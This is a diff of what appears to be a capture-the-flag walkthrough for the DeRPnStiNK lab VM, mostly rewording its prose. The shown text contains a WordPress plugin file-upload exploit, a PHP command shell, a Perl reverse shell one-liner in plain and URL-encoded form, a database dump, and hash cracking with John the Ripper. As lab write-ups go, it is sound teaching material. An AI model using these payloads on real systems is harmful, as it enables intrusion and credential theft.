@@ -46,9 +46,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 My usual game plan is to target the web service first whenever `nmap` tells me `robots.txt` exists. Let's start with that.
 
-### HTML Source
+### HTML Source Code
 
-I capture the first flag using `curl` and some `grep`-fu on the HTML source. Easy.
+I manage to capture the first flag using `curl` and some `grep`-fu on the HTML source code.
 
 ```
 # curl -s 192.168.10.130 | grep -P 'href=|src=|<!?--' | sed -r 's/^\s+//'
@@ -67,7 +67,7 @@ I capture the first flag using `curl` and some `grep`-fu on the HTML source. Eas
 
 ### Web Notes
 
-There's something else out there as well — `/webnotes`
+I notice something else from the HTML source code as well — `/webnotes`
 
 ```
 # curl http://192.168.10.130/webnotes/
@@ -150,7 +150,7 @@ PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
 stinky@DeRPnStiNK:~$
 ```
-From above, I'm able to infer the following information:
+From above, I can infer the following:
 
 * The FQDN of the host is `derpnstink.local`; and
 * User `stinky` exists; and
@@ -158,7 +158,7 @@ From above, I'm able to infer the following information:
 
 ### Directory/File Enumeration
 
-Using `gobuster` with one of the big wordlists for a quick enumeration, I'm able to find these directories.
+I'm able to find these directories with `gobuster` and `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`.
 
 ```
 Gobuster v1.2                OJ Reeves (@TheColonial)
@@ -181,18 +181,7 @@ http://192.168.10.130/temporary (Status: 301)
 
 Both `/php` and `/temporary` are already in `robots.txt`.
 
-Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists), I'm able to find more directories.
-
-```
-http://192.168.10.130/php/info.php (Status: 200)
-http://192.168.10.130/php/phpmyadmin (Status: 301)
-http://192.168.10.130/weblog/index.php (Status: 200)
-http://192.168.10.130/weblog/wp-admin (Status: 301)
-http://192.168.10.130/weblog/wp-content (Status: 301)
-http://192.168.10.130/weblog/wp-includes (Status: 301)
-```
-
-It appears that `/weblog` is the root directory for WordPress. There's a need to place the FQDN in `/etc/hosts`.
+It appears that `/weblog` is the root directory for WordPress, and there's a need to place the FQDN `derpnstink.local` in `/etc/hosts` according to the redirection.
 
 ```
 curl -i 192.168.10.130/weblog/
@@ -213,7 +202,7 @@ There's another hint from `/webnotes/info.txt` to do likewise.
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan` to identify vulnerable WordPress plugins, I was able to find this particular version (1.4.6), has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
+Using `wpscan` to identify vulnerable WordPress plugins, I'm able to find this particular version (1.4.6) that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
 I wrote `upload.sh`, a `bash` script to upload files based on the vulnerability.
 
@@ -260,7 +249,7 @@ curl \
 rm -rf cookie
 {% endhighlight %}
 
-I upload a simple PHP file that executes remote command, with the script.
+Let's upload, with the script, a simple PHP file that executes remote command.
 
 ```
 # cat cmd.php
@@ -269,15 +258,17 @@ I upload a simple PHP file that executes remote command, with the script.
 # ./upload.sh cmd.php
 ```
 
+The uploaded file is at `http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php`.
+
 ### Low Privilege Shell
 
-After I upload the file, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
+After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
 
 ```perl
 perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-Since we are passing the above command to `cmd.php`, it's best to `urlencode` it to avoid complications. The entire URL looks like this.
+Since we are putting the above command to `cmd.php`, it's best to `urlencode` it to avoid complications. The entire URL looks like this.
 
 ```
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
@@ -317,7 +308,7 @@ Let's proceed to dump and view the database.
 $ mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
 ```
 
-The **second flag** and **password hashes** stick out from the dump like a sore thumb.
+I manage to capture the **second flag**, and discover WordPress **password hashes** from the dump.
 
 ```
 'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'
@@ -329,7 +320,7 @@ INSERT INTO `wp_users` VALUES (1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC
 
 ### John the Ripper
 
-Using John the Ripper with a wordlist like "rockyou" on Kali Linux, cracking WordPress password hash has never been easier.
+Using John the Ripper with a wordlist like "rockyou" on Kali Linux, cracking WordPress password hashes have never been easier.
 
 ```
 # john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
@@ -355,9 +346,9 @@ Let's see if we can log in to Uncle Stinky's account with the password (`wedgie5
 
 ![screenshot-4](/assets/images/posts/derpnstink-walkthrough/screenshot-4.png)
 
-During enumeration of Uncle Stinky's account, I discover the third flag at `/home/stinky/Desktop/flag.txt`.
+I discover the third flag at `/home/stinky/Desktop/flag.txt` during enumeration of Uncle Stinky's account.
 
-Enumerating further, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears Mr. Derp can't log in to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
+Moving further, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears that Mr. Derp can't log in to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
 
 ```
 $ cd ~/ftp/files/network-logs
@@ -389,7 +380,7 @@ Let's log in to Mr. Derp's account with the password (`derpderpderpderpderpderpd
 
 ![screenshot-5](/assets/images/posts/derpnstink-walkthrough/screenshot-5.png)
 
-I uncover a helpdesk ticket during the enumeration of Mr. Derp's account. Apparently, Mr. Derp has an issue with `sudoer`.
+I uncover a helpdesk ticket during enumeration of Mr. Derp's account. Apparently, Mr. Derp has an issue with `sudoer`.
 
 ```
 $ cd /support
@@ -415,7 +406,7 @@ Thank you for using our product.
 ********************************************************************
 ```
 
-The resolution is at `https://pastebin.com/RzK9WfGw`.
+We find the resolution of the helpdesk ticket at `https://pastebin.com/RzK9WfGw`.
 
 ![screenshot-6](/assets/images/posts/derpnstink-walkthrough/screenshot-6.png)
 
